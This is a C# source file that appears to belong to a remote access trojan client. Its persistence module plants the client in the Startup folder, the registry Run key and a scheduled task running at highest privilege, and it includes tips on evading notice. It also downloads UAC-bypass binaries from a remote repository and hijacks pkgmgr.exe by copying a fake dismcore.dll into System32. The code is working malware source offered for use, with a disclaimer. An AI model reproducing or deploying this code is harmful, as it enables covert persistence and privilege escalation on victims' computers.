using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows.Forms;

using Microsoft.Win32;

using TutClient.Enum;
using TutClient.Helpers;

namespace TutClient.Controls
{
    public interface IUAC
    {
        void ProbeStart(ProbeMethod pm);
    }

    /// <summary>
    /// The UAC / Persistence module
    /// </summary>
    public class UAC : IUAC
    {
        private readonly IReportHelper _reportHelper;

        public UAC(IReportHelper reportHelper)
        {
            _reportHelper = reportHelper;
        }

        /// <summary>
        /// Create a new shortcut file
        /// </summary>
        /// <param name="targetFile">The shortcut file's path</param>
        /// <param name="linkedFile">The file to point the shortcut to</param>
        private void CreateShortcut(string targetFile, string linkedFile)
        {
            try
            {
                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshRuntimeLibrary.IWshShell_Class(); //Get a new shell
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)wsh.CreateShortcut(targetFile); //Create the shortcut object
                shortcut.TargetPath = linkedFile; //Set the target path
                shortcut.WorkingDirectory = Application.StartupPath; //Set the working directory important!!
                shortcut.Save(); //Save the object (write to disk)
                                 //Console.WriteLine("Shortcut created");
            }
            catch (Exception ex) //Failed to create shortcut
            {
                Console.WriteLine("Error creating shortcut: " + ex.Message);
            }
        }

        /// <summary>
        /// Auto download the UAC bypass toolkit
        /// </summary>
        /// <returns>The progress of the bypass</returns>
        public IEnumerable<int> AutoLoadBypass()
        {
#if EnableAutoBypass
            //I am not responsible for any damage done! And i am not spreading the malware, using it is optional!
            const string link64 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x64%20bit/"; //Directory to 64 bit version
            const string link86 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x86%20bit/"; //Driectroy to 32 bit verion
            const string unattendFile = "https://raw.githubusercontent.com/AdvancedHacker101/Bypass-Uac/master/unattend.xml"; //The unattend file
            string[] filesToLoad = { "copyFile.exe", "testAnything.exe", "testDll.dll" }; //Remote file names to download
            string[] localName = { "copyFile.exe", "launch.exe", "dismcore.dll" }; //Local file names to save the remote files to
            bool is64 = Is64Bit(); //Get if the system is x64
            string link = ""; //The root link to use
            if (is64) link = link64; //Use the x64 link
            else link = link86; //Use the x86 link
            int index = 0; //Index counter
            WebClient wc = new WebClient(); //Create a new web-client

            foreach (string file in filesToLoad) //go through the remote files
            {
                wc.DownloadFile(link + file, Application.StartupPath + "\\" + localName[index]); //Download the remote file
                index++; //Increment the index
                yield return 25; //Return a 25% increase in the progress
            }

            wc.DownloadFile(unattendFile, Application.StartupPath + "\\unattend.xml"); //Download the unattend file
            yield return 25; //Return a 25% increase in the progress
#else
            return Enumerable.Empty<int>();
#endif
        }

        /// <summary>
        /// Probe the startup
        /// </summary>
        /// <param name="pm">The method to use</param>
        public void ProbeStart(ProbeMethod pm)
        {
            if (pm == ProbeMethod.StartUpFolder) //Probe starup folder
            {
                var suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup); //Get the path of the startup folder
                var linkFile = suFolder + "\\" + "client.lnk"; //Be creative if you want to get away with it :)
                if(!File.Exists(linkFile))
                {
                    CreateShortcut(linkFile, Application.ExecutablePath); //Create the new link file
                }
            }
            else if (pm == ProbeMethod.Registry) //Probe the registry
            {
                if (!IsAdmin()) //Check if client is admin
                {
                    //Report error to the server
                    _reportHelper.ReportError(ErrorType.ADMIN_REQUIRED, "Failed to probe registry", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
                    return; //Return
                }
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true); //Get the usual registry key
                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false); //Check and remove value
                key.SetValue("tut_client", Application.ExecutablePath); //Add the new value
                                                                        //Close and dispose the key
                key.Close();
                key.Dispose();
                key = null;
            }
            else if (pm == ProbeMethod.TaskScheduler) //Probe TaskScheduler
            {
                if (!IsAdmin()) //Check if client is admin
                {
                    //Report error to the server
                    _reportHelper.ReportError(ErrorType.ADMIN_REQUIRED, "Failed to probe Task Scheduler", "R.A.T is not running as admin! You can try to bypass the uac or use the startup folder method!");
                    return; //Return
                }
                Process deltask = new Process(); //Delete previous task
                Process addtask = new Process(); //Create the new task
                deltask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F"; //Set tasksch command
                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //Hidden process
                deltask.Start(); //Delete the task
                deltask.WaitForExit(); //Wait for it to finish
                                       //Console.WriteLine("Delete Task Completed");
                addtask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST"; //Set tasksch command
                addtask.Start(); //Add the new task
                addtask.WaitForExit(); //Wait for it to finish
                                       //Console.WriteLine("Task created successfully!");
            }
        }

        /// <summary>
        /// Check if client is running elevated
        /// </summary>
        /// <returns>True if client is elevated, otherwise false</returns>
        public bool IsAdmin()
        {
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent(); //Get my identity
            var principal = new System.Security.Principal.WindowsPrincipal(identity); //Get my principal
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); //Check if i'm an elevated process
        }

        /// <summary>
        /// Check if the system is x64
        /// </summary>
        /// <returns>True if system is x64, otherwise false</returns>
        private bool Is64Bit()
        {
            return Environment.Is64BitOperatingSystem; //Return the x64 state
        }

        /// <summary>
        /// Close the current client
        /// </summary>
        private void CloseInstance()
        {
            var self = Process.GetCurrentProcess(); //Get my process
            self.Kill(); //Stop the current client
        }

        /// <summary>
        /// Try to bypass the UAC
        /// </summary>
        /// <returns>True if bypass is successful</returns>
        public bool BypassUac()
        {
            //Declare key file names
            const string DISM_CORE_DLL = "dismcore.dll";
            const string COPY_FILE = "copyFile.exe";
            const string UNATTEND_FILE = "unattend.xml";
            const string LAUNCHER_FILE = "launch.exe";

            //Check core files

            if (!File.Exists(DISM_CORE_DLL) || !File.Exists(COPY_FILE) || !File.Exists(UNATTEND_FILE) || !File.Exists(LAUNCHER_FILE))
            {
                _reportHelper.ReportError(ErrorType.FILE_NOT_FOUND, "UAC Bypass", "One or more of the core files not found");
                return false;
            }

            //Copy fake dismcore.dll into System32

            var startInfo = new ProcessStartInfo
            {
                FileName = Application.StartupPath + "\\" + COPY_FILE,
                Arguments = "\"" + Application.StartupPath + "\\" + DISM_CORE_DLL + "\" C:\\Windows\\System32",
                WindowStyle = ProcessWindowStyle.Hidden
            };

            var elevatedCopy = new Process
            {
                StartInfo = startInfo
            };

            elevatedCopy.Start();
            Console.WriteLine("Waiting for elevated copy to finish");
            elevatedCopy.WaitForExit();
            
            if (elevatedCopy.ExitCode != 0)
            {
                Console.WriteLine("Error during elevated copy");
            }

            //Create a file pointing to the startup path (reference for the fake dll)
            var tempFileLocation = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp\\clientlocationx12.txt";

            if (!File.Exists(tempFileLocation))
            {
                File.Create(tempFileLocation).Close();
            }

            File.WriteAllText(tempFileLocation, Application.StartupPath);

            //Trigger dismcore.dll with pgkmgr.exe
            startInfo = new ProcessStartInfo
            {
                FileName = Application.StartupPath + "\\" + LAUNCHER_FILE,
                Arguments = "C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"" + Application.StartupPath + "\\" + UNATTEND_FILE + "\"\"",
                WindowStyle = ProcessWindowStyle.Hidden
            };
            
            var bypassProcess = new Process
            {
                StartInfo = startInfo
            };
            bypassProcess.Start();
            Console.WriteLine("Waiting for bypass process to finish");
            
            bypassProcess.WaitForExit();
            Console.WriteLine("Bypass completed");
            
            return true;
        }
    }
}
